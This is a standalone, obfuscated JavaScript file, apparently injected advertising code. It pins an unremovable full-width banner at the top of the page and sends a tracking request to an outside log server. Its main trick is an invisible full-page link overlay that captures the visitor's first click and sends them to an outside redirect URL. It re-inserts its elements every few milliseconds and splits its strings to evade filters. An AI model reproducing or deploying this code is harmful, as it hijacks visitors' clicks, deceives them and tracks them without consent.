(function () {
    var a = {}, _ele = 'div';
    if (document.getElementById(a.gaskfh) != undefined) return;
    a.OY = function (css) {
        var s = document.createElement('st' + 'yle');
        s.appendChild(document.createTextNode(css));
        document.body.appendChild(s);
    };
    a.AP = function (inn) {
        if (inn == undefined) return false;
        var x = document.createElement(_ele);
        x.className = a.gaskfh;
        x.id = a.gaskfh;
        x.innerHTML = inn;
        document.body.appendChild(x);
    };
    a.LG = function () {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.open(String.fromCharCode(71, 69, 84), _logurl, true);
        xmlhttp.send();
    };
    a.gaskfh = 'i' + Math.random().toString().substr(15);
    var _adimg = 'https://te.sgyhdq.com/LfKHfwesd1106/10/1509420437210563.jpeg';
    var _tjurl = 'http://guo.kbstyn.com/viewthread.php?MTE2LDE0NiwyLDI3ODEsNCw4LDE5MDE1MzA0MTgsMTUxMzcsMiwxLDM6O2h0dHA6Ly96LmNvZGUuemFudGFpbmV0LmNvbS9zeWNvZGUvMTMxMTM0Lmh0bWw=';
    var _tjurl2 = 'http://guo.kbstyn.com/viewthread.php?MTE2LDE0NiwyLDI3ODEsNCw4LDE5MDE1MzA0MTgsMTUxMzcsMiwyLDM6O2h0dHA6Ly96LmNvZGUuemFudGFpbmV0LmNvbS9zeWNvZGUvMTMxMTM0Lmh0bWw=';
    var _imgurl = 'https://te.sgyhdq.com/';
    var _adimg_base64 = '';
    var _logurl = 'http://da.zzsdjq.com/log.php?enc=fcQ%2B6m%2B4b60LTOA%2BoEphaeh%2FHkYbO6dnBEgMvDi0YdIx5PfwNQdpzO5TRwCuistkBPLwgM9yXE%2F5g6tmjHkZ0XkyONaVCwVq4WaNap6tRJ6Z7qlMGe81i7b1vk%2Bp2nCPyUb2v2Y3cpRiNmP2UsyDN7fOaBjkmwVEv%2Fut%2FD7LnNjSQygNh42HcbILFYx0xUj9DoidAkS2r1LLg2ckUICjvoN4ota%2BvSF4%2BAgL4j3oZgHNZishHIe7B7%2FzdPbPFvnqrP9b54a4jnB%2Bq8XMSe2cpg%3D%3D';

    var _css = '';
    _css += '#' + a.gaskfh + '{line-he' + 'ight:0;pos' + 'ition:fix' + 'ed!impor' + 'tant;z-index:2147' + '483647!impor' + 'tant;width:100%!impor' + 'tant;left:0px!impo' + 'rtant;top:0px;clea' + 'r:both;text-indent:0;}';
    _css += '#' + a.gaskfh + 'i{di' + 'splay:block;pos' + 'ition:rel' + 'ative;le' + 'ft:0;bot' + 'tom:0;wid' + 'th:10' + '0%;height:auto;}';
    _css += '#' + a.gaskfh + 'a{di' + 'splay:block;posi' + 'tion:abs' + 'olute;left:0;bottom:0;width:100%;height:auto;z-' + 'index:9' + '99;}';
    _css += '#' + a.gaskfh + 'e{di' + 'splay:block;pos' + 'ition:abso' + 'lute;left:0;top:0;width:100%;height:auto;z-index:99' + '9;-webkit-tap-highlight-color:transp' + 'arent;}';
    _css += '#' + a.gaskfh + 'c{di' + 'splay:b' + 'lock;posit' + 'ion:abso' + 'lute;botto' + 'm:0;right:0;margin-bo' + 'ttom:0px;z-index:9' + '99}';
    _css += '#' + a.gaskfh + 'c img{disp' + 'lay:block;wi' + 'dth:auto;height:20' + 'px;}';
    _css += '#' + a.gaskfh + 'p{d' + 'isplay:bl' + 'ock;wi' + 'dth:100%;h' + 'eight:' + (document.body.clientWidth / 640 * 150) + 'px;}';

    var _inn = '';
    _inn += '<img id="' + a.gaskfh + 'i" src="' + _adimg + '">';
    _inn += '<a id="' + a.gaskfh + 'a" href="' + _tjurl + '"> </a>';
    _inn += '<a id="' + a.gaskfh + 'e" href="' + _tjurl2 + '"> </a>';
    _inn += '<a id="' + a.gaskfh + 'c" href="javascript:;"><img src="' + _imgurl + 'esolc.png"></a>';

    a.OY(_css);
    a.AP(_inn);

    var div = document.createElement('div');
    div.id = a.gaskfh + 'p';
    div.innerHTML = '<span style="display:none;">padding</span>';
    document.body.insertBefore(div, document.body.firstChild);

    var Xi = document.getElementById(a.gaskfh + 'i');
    var imgOnLoad = function () {
        a.LG();
        var Xa = document.getElementById(a.gaskfh + 'a');
        Xa.style.height = Xi.height + 'px';
        var Xe = document.getElementById(a.gaskfh + 'e');
        Xe.style.display = 'none';
        Xe.onclick = function () {
            this.style.display = 'none';
        };
        var Xc = document.getElementById(a.gaskfh + 'c');
        Xc.onclick = function () {
            clearInterval(aerfhwe);
            document.getElementById(a.gaskfh).style.display = 'none';
            document.getElementById(a.gaskfh + 'p').style.display = 'none';
        };
        if (document.body.scrollTop > 150 || document.documentElement.scrollTop > 150) {
            var e = document.createEvent('h'.toUpperCase() + 'TMLEvents');
            e.initEvent('sc' + 'roll', false, false);
            window.dispatchEvent(e);
        }
    };
    if (Xi.complete) {
        imgOnLoad();
    } else {
        Xi.onload = imgOnLoad;
    }
    setInterval(function () {
        if (document.body.firstChild !== document.getElementById(a.gaskfh)) {
            document.body.insertBefore(document.getElementById(a.gaskfh + 'p'), document.body.firstChild);
            document.body.insertBefore(document.getElementById(a.gaskfh), document.body.firstChild);
        }
    }, 500);
    var aerfhwe = setInterval(function () {
        var ele = document.getElementById(a.gaskfh);
        ele.removeAttribute('st' + 'yle');
        if (ele == null) {
            a.AP(_inn);
        }
        var ele = document.getElementById(a.gaskfh + 'p');
        ele.removeAttribute('st' + 'yle');
        if (ele == null) {
            document.body.insertBefore(div, document.body.firstChild);
        }
    }, 0);


    var obj = new Object;
    obj.append = function (e) {
        for (var t in{body: 1}) {
            var ele = document.getElementsByTagName(t);
            for (var i = 0; i < ele.length; i++) {
                ele[i].insertBefore(e, ele[i].firstChild);
                return
            }
        }
    }
    obj.a_pop = function (url) {
        if (document.cookie.indexOf('dsa=1') > -1) return;
        if (document.cookie.indexOf('asd' + 'plan2781=1') > -1) return;
        var atag = document.createElement("a");
        atag.href = url;
        var div = document.createElement('div');
        div.style.backgroundColor = '#fff';
        atag.appendChild(div);
        obj.append(atag);
        var atags = atag.style;
        atags.position = "absolute";
        atags.zIndex = '214' + '7483' + '647';
        atags.display = 'bl' + 'ock';
        atags.top = '0';
        atags.left = '0';
        atags.cursor = 'default';
        atags.opacity = '0';
        var m = setInterval(function () {
            atag.style.zIndex = '214' + '7483' + '647';
            var d = (document.compatMode.toLowerCase() == 'css' + '1compat') ? document.documentElement : document.body;
            atag.style.top = Math.max(document.documentElement.scrollTop, document.body.scrollTop) + 'px';
            div.style.width = Math.min(d.clientWidth, d.scrollWidth) + 'px';
            div.style.height = d.clientHeight + 'px';
        }, 120);
        atag.onclick = function (e) {
            e = e || window.event;
            e.cancelBubble = true;
            setTimeout(function () {
                atag.parentNode.removeChild(atag)
            }, 200);
            clearInterval(m);
            var date = new Date();
            date.setTime(date.getTime() + 300 * 1000);
            document.cookie = 'dsa=1;expires=' + date.toGMTString() + ';path=/;';
            date = new Date();
            date.setTime((24 * 60 * 60 * 1000 - (date.getTime() - (new Date(date.toLocaleDateString()).getTime() - 1))) + date.getTime());
            document.cookie = 'asd' + 'plan2781=1;exp' + 'ires=' + date.toGMTString() + ';path=/;';
        };
    }
    obj.a_pop(_tjurl2);
})();
